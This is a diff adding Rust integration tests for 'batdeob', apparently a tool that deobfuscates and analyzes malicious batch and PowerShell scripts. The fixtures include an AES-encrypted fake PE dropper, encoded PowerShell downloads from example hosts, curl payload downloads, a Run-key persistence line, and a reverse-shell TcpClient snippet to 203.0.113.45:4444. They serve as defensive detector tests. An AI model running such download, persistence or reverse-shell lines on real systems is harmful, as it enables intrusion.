@@ -1,0 +1,502 @@
+#![allow(clippy::expect_used, clippy::unwrap_used)]
+
+use assert_cmd::Command;
+use std::fs;
+use tempfile::TempDir;
+
+#[test]
+fn deob_writes_deobfuscated_file() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(&input, "set X=hi\r\necho %X%\r\n").expect("write");
+    let out_dir = dir.path().join("out");
+    Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "deob",
+            input.to_str().expect("path"),
+            "-o",
+            out_dir.to_str().expect("path"),
+        ])
+        .assert()
+        .success();
+    let deob = out_dir.join("deobfuscated.bat");
+    assert!(deob.exists(), "deobfuscated.bat not produced");
+    let contents = fs::read_to_string(&deob).expect("read");
+    assert!(contents.contains("echo hi"), "got:\n{}", contents);
+}
+
+#[test]
+fn deob_writes_extracted_child_bat() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(&input, r#"cmd /c "echo hi""#).expect("write");
+    let out_dir = dir.path().join("out");
+    Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "deob",
+            input.to_str().expect("path"),
+            "-o",
+            out_dir.to_str().expect("path"),
+        ])
+        .assert()
+        .success();
+
+    let entries: Vec<_> = fs::read_dir(&out_dir)
+        .expect("read out")
+        .filter_map(|e| e.ok())
+        .map(|e| e.file_name().to_string_lossy().to_string())
+        .collect();
+    let has_child_bat = entries
+        .iter()
+        .any(|n| n.ends_with(".bat") && n != "deobfuscated.bat");
+    assert!(has_child_bat, "no child .bat in {:?}", entries);
+}
+
+#[test]
+fn deob_writes_traits_json() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(&input, "echo hi").expect("write");
+    let out_dir = dir.path().join("out");
+    Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "deob",
+            input.to_str().expect("path"),
+            "-o",
+            out_dir.to_str().expect("path"),
+        ])
+        .assert()
+        .success();
+
+    let traits_path = out_dir.join("traits.json");
+    assert!(traits_path.exists(), "traits.json missing");
+    let contents = fs::read_to_string(&traits_path).expect("read");
+    // Should parse as JSON array (possibly empty)
+    let _: serde_json::Value = serde_json::from_str(&contents).expect("valid json");
+}
+
+#[test]
+fn deob_writes_recovered_pe_blob_and_meta_file() {
+    // Synthesize a minimal AES-chain dropper: a `:: <b64>` line whose
+    // ciphertext is AES-CBC-encrypted + gzipped + starts with `MZ`,
+    // plus the PS body that carries the Key+IV literals. End-to-end
+    // exercises the orchestrator's `recovered_pe.push(...)` + the CLI's
+    // dump-with-companion-meta logic.
+    use aes::cipher::{block_padding::Pkcs7, BlockEncryptMut, KeyIvInit};
+    use base64::Engine;
+    use flate2::write::GzEncoder;
+    use flate2::Compression;
+    use std::io::Write;
+
+    type Aes256CbcEnc = cbc::Encryptor<aes::Aes256>;
+
+    let key: [u8; 32] = *b"01234567890123456789012345678901";
+    let iv: [u8; 16] = *b"abcdefghijklmnop";
+
+    // Fake PE — must be big enough that gzip(pe) → AES-CBC → base64
+    // exceeds the orchestrator's 200-char `::\s?<b64>{200,}` gate.
+    // Pad with non-zero pseudorandom bytes so gzip can't compress it
+    // away to nothing.
+    let mut pe = vec![0u8; 2048];
+    pe[0] = b'M';
+    pe[1] = b'Z';
+    pe[0x3c] = 0x40;
+    pe[0x40] = b'P';
+    pe[0x41] = b'E';
+    pe[0x56] = 0x02;
+    // Sprinkle non-zero data after the headers so the gzip output is
+    // large enough to clear the gate.
+    for (i, slot) in pe[256..].iter_mut().enumerate() {
+        *slot = (i as u8).wrapping_mul(31).wrapping_add(7);
+    }
+
+    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
+    gz.write_all(&pe).expect("gz write");
+    let gzipped = gz.finish().expect("gz finish");
+
+    let mut ct = vec![0u8; gzipped.len() + 16];
+    let ct_len = Aes256CbcEnc::new(&key.into(), &iv.into())
+        .encrypt_padded_b2b_mut::<Pkcs7>(&gzipped, &mut ct)
+        .expect("encrypt")
+        .len();
+    ct.truncate(ct_len);
+
+    let ct_b64 = base64::engine::general_purpose::STANDARD.encode(&ct);
+    let key_b64 = base64::engine::general_purpose::STANDARD.encode(key);
+    let iv_b64 = base64::engine::general_purpose::STANDARD.encode(iv);
+
+    // Minimum PS body shape the orchestrator's `try_extract_simple_ps_aes`
+    // accepts — the colon-space envelope plus Key/IV literals in PS form.
+    let script = format!(
+        "@echo off\r\n\
+         set \"EtnCTS=$a.Key=[System.Convert]::FromBase64String('{key_b64}');\
+         $a.IV=[System.Convert]::FromBase64String('{iv_b64}');\"\r\n\
+         :: {ct_b64}\r\n"
+    );
+
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(&input, &script).expect("write");
+    let out_dir = dir.path().join("out");
+    Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "deob",
+            input.to_str().expect("path"),
+            "-o",
+            out_dir.to_str().expect("path"),
+        ])
+        .assert()
+        .success();
+
+    let entries: Vec<_> = fs::read_dir(&out_dir)
+        .expect("read out")
+        .filter_map(|e| e.ok())
+        .map(|e| e.file_name().to_string_lossy().to_string())
+        .collect();
+    let exe = entries.iter().find(|n| n.ends_with(".exe"));
+    let meta = entries.iter().find(|n| n.ends_with(".meta"));
+    assert!(
+        exe.is_some(),
+        "no recovered .exe in out-dir; got {:?}",
+        entries
+    );
+    assert!(
+        meta.is_some(),
+        "no .meta companion in out-dir; got {:?}",
+        entries
+    );
+    // .exe bytes should be the PE we encrypted in.
+    let exe_bytes = fs::read(out_dir.join(exe.unwrap())).expect("read exe");
+    assert_eq!(&exe_bytes[..2], b"MZ");
+    // .meta should mention the origin label.
+    let meta_text = fs::read_to_string(out_dir.join(meta.unwrap())).expect("read meta");
+    assert!(
+        meta_text.contains("origin:") && meta_text.contains("size:"),
+        ".meta missing fields:\n{meta_text}"
+    );
+}
+
+#[test]
+fn deob_writes_extracted_ps1() {
+    use base64::Engine;
+    let payload = "Write-Host hi";
+    let utf16: Vec<u8> = payload
+        .encode_utf16()
+        .flat_map(|u| u.to_le_bytes())
+        .collect();
+    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
+
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(&input, format!("powershell -EncodedCommand {}", b64)).expect("write");
+    let out_dir = dir.path().join("out");
+    Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "deob",
+            input.to_str().expect("path"),
+            "-o",
+            out_dir.to_str().expect("path"),
+        ])
+        .assert()
+        .success();
+
+    let entries: Vec<_> = fs::read_dir(&out_dir)
+        .expect("read out")
+        .filter_map(|e| e.ok())
+        .map(|e| e.file_name().to_string_lossy().to_string())
+        .collect();
+    let has_ps1 = entries.iter().any(|n| n.ends_with(".ps1"));
+    assert!(has_ps1, "no .ps1 in {:?}", entries);
+}
+
+#[test]
+fn deob_writes_normalized_ps1_when_readability_improves() {
+    use base64::Engine;
+    let decoded = "Invoke-WebRequest -Uri 'https://readable.example/payload.exe'";
+    let decoded_b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+    let payload = format!(
+        "iex ([System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('{decoded_b64}')))"
+    );
+    let utf16: Vec<u8> = payload
+        .encode_utf16()
+        .flat_map(|u| u.to_le_bytes())
+        .collect();
+    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
+
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(&input, format!("powershell -EncodedCommand {}", b64)).expect("write");
+    let out_dir = dir.path().join("out");
+    Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "deob",
+            input.to_str().expect("path"),
+            "-o",
+            out_dir.to_str().expect("path"),
+        ])
+        .assert()
+        .success();
+
+    let normalized = fs::read_dir(&out_dir)
+        .expect("read out")
+        .filter_map(|e| e.ok())
+        .find(|e| e.file_name().to_string_lossy().ends_with(".normalized.ps1"))
+        .expect("normalized ps1 missing");
+    let contents = fs::read_to_string(normalized.path()).expect("read normalized ps1");
+    assert!(
+        contents.contains("https://readable.example/payload.exe"),
+        "got:\n{}",
+        contents
+    );
+}
+
+#[test]
+fn analyze_recurses_into_echoed_encoded_powershell_batch() {
+    use base64::Engine;
+
+    let decoded = "Invoke-WebRequest -Uri https://recursive.example/m2.zip";
+    let utf16: Vec<u8> = decoded
+        .encode_utf16()
+        .flat_map(|u| u.to_le_bytes())
+        .collect();
+    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
+
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        format!(
+            "@echo off\r\necho @echo off>hidden.bat\r\necho Powershell -NoProfile -Encoded {b64}>>hidden.bat\r\n"
+        ),
+    )
+    .expect("write");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
+        .output()
+        .expect("run");
+    assert!(
+        out.status.success(),
+        "stderr: {}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let stdout = String::from_utf8_lossy(&out.stdout);
+    assert!(
+        stdout.contains("https://recursive.example/m2.zip"),
+        "stdout:\n{}",
+        stdout
+    );
+}
+
+#[test]
+fn analyze_emits_json_to_stdout() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(&input, "echo plain\r\n").expect("write");
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["analyze", input.to_str().expect("path")])
+        .output()
+        .expect("run");
+    assert!(
+        out.status.success(),
+        "stderr: {}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let s = String::from_utf8_lossy(&out.stdout);
+    assert!(s.contains("\"deobfuscated\""), "stdout:\n{}", s);
+}
+
+#[test]
+fn report_default_omits_raw_text_includes_full_traits() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(&input, "curl -o out.exe http://x.example.com/y.exe\r\n").expect("write");
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["report", input.to_str().expect("path")])
+        .output()
+        .expect("run");
+    assert!(
+        out.status.success(),
+        "stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let s = String::from_utf8_lossy(&out.stdout);
+    // Full typed trait list lands in `traits`; analyst-friendly downloads
+    // still in `downloads`; sha256 is computed.
+    assert!(s.contains("\"traits\""), "stdout:\n{}", s);
+    assert!(s.contains("\"downloads\""), "stdout:\n{}", s);
+    assert!(s.contains("\"input_sha256\""), "stdout:\n{}", s);
+    assert!(s.contains("x.example.com/y.exe"), "url missing: {}", s);
+    // Source and deob are off by default.
+    assert!(!s.contains("\"source\""), "default included source: {}", s);
+    assert!(
+        !s.contains("\"deobfuscated\""),
+        "default included deob: {}",
+        s
+    );
+}
+
+#[test]
+fn report_include_source_and_deob_inlines_both() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(&input, "set X=marker_XYZ\r\necho %X%\r\n").expect("write");
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "report",
+            "--include-source",
+            "--include-deob",
+            input.to_str().expect("path"),
+        ])
+        .output()
+        .expect("run");
+    assert!(
+        out.status.success(),
+        "stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let s = String::from_utf8_lossy(&out.stdout);
+    assert!(s.contains("\"source\""), "source missing");
+    assert!(s.contains("\"deobfuscated\""), "deobfuscated missing");
+    // Source verbatim (json-escaped).
+    assert!(s.contains("marker_XYZ"), "marker missing from source/deob");
+}
+
+#[test]
+fn analyze_jsonl_emits_lines() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(&input, "curl http://x/y\r\n").expect("write");
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
+        .output()
+        .expect("run");
+    assert!(out.status.success());
+    let s = String::from_utf8_lossy(&out.stdout);
+    let lines: Vec<&str> = s.lines().collect();
+    assert!(lines.len() >= 2, "expected >=2 lines, got: {:?}", lines);
+    // Each line is valid JSON
+    for line in &lines {
+        let _: serde_json::Value = serde_json::from_str(line).expect("valid json line");
+    }
+    // First line is meta
+    let first: serde_json::Value = serde_json::from_str(lines[0]).expect("first line");
+    assert_eq!(first["kind"], "meta");
+}
+
+#[test]
+fn summarize_emits_compact_report() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        "curl -o out.exe http://x/y.exe\r\nreg add HKLM\\Run /v Evil /d \"C:\\\\evil.exe\"\r\n",
+    )
+    .expect("write");
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["summarize", input.to_str().expect("path")])
+        .output()
+        .expect("run");
+    assert!(
+        out.status.success(),
+        "stderr: {}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let s = String::from_utf8_lossy(&out.stdout);
+    let v: serde_json::Value = serde_json::from_str(&s).expect("valid json");
+    assert!(!v["downloads"].as_array().expect("downloads").is_empty());
+    assert!(v["admin_commands"]["reg"].as_u64().expect("reg count") >= 1);
+}
+
+#[test]
+fn tldr_surfaces_remote_connect_disguised_extrac32_and_recovered_pe_count() {
+    use base64::Engine;
+    // Compose a script that hits multiple TLDR-relevant code paths at
+    // once: a PS reverse-shell IP+port pair (RemoteConnect via
+    // var-socket scanner), then exercise the tldr output.
+    let script = r#"#powershell
+$ipaddress = '203.0.113.45'
+$dport = 4444
+$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
+"#;
+
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("rev.ps1");
+    fs::write(&input, script).expect("write");
+
+    let assert = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["summarize", "--tldr", input.to_str().expect("path")])
+        .assert()
+        .success();
+
+    let out = String::from_utf8_lossy(&assert.get_output().stdout).to_string();
+    assert!(
+        out.contains("C2 connect") && out.contains("203.0.113.45:4444"),
+        "tldr missing C2 connect for var-pair reverse shell:\n{out}"
+    );
+
+    // Also exercise the recovered-PE branch via the same minimal
+    // AES-chain fixture from `deob_writes_recovered_pe_blob_and_meta_file`.
+    use aes::cipher::{block_padding::Pkcs7, BlockEncryptMut, KeyIvInit};
+    use flate2::write::GzEncoder;
+    use flate2::Compression;
+    use std::io::Write;
+    type Aes256CbcEnc = cbc::Encryptor<aes::Aes256>;
+
+    let key: [u8; 32] = *b"01234567890123456789012345678901";
+    let iv: [u8; 16] = *b"abcdefghijklmnop";
+    let mut pe = vec![0u8; 2048];
+    pe[0] = b'M';
+    pe[1] = b'Z';
+    pe[0x3c] = 0x40;
+    pe[0x40] = b'P';
+    pe[0x41] = b'E';
+    pe[0x56] = 0x02;
+    for (i, slot) in pe[256..].iter_mut().enumerate() {
+        *slot = (i as u8).wrapping_mul(31).wrapping_add(7);
+    }
+    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
+    gz.write_all(&pe).expect("gz");
+    let gzipped = gz.finish().expect("gz finish");
+    let mut ct = vec![0u8; gzipped.len() + 16];
+    let ct_len = Aes256CbcEnc::new(&key.into(), &iv.into())
+        .encrypt_padded_b2b_mut::<Pkcs7>(&gzipped, &mut ct)
+        .expect("encrypt")
+        .len();
+    ct.truncate(ct_len);
+    let ct_b64 = base64::engine::general_purpose::STANDARD.encode(&ct);
+    let key_b64 = base64::engine::general_purpose::STANDARD.encode(key);
+    let iv_b64 = base64::engine::general_purpose::STANDARD.encode(iv);
+
+    let aes_script = format!(
+        "@echo off\r\n\
+         set \"X=$a.Key=[System.Convert]::FromBase64String('{key_b64}');\
+         $a.IV=[System.Convert]::FromBase64String('{iv_b64}');\"\r\n\
+         :: {ct_b64}\r\n"
+    );
+    let aes_input = dir.path().join("aes.bat");
+    fs::write(&aes_input, &aes_script).expect("write aes");
+    let aes_assert = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["summarize", "--tldr", aes_input.to_str().expect("path")])
+        .assert()
+        .success();
+    let aes_out = String::from_utf8_lossy(&aes_assert.get_output().stdout).to_string();
+    assert!(
+        aes_out.contains("Recovered PE blobs:"),
+        "tldr missing recovered-PE count:\n{aes_out}"
+    );
+}
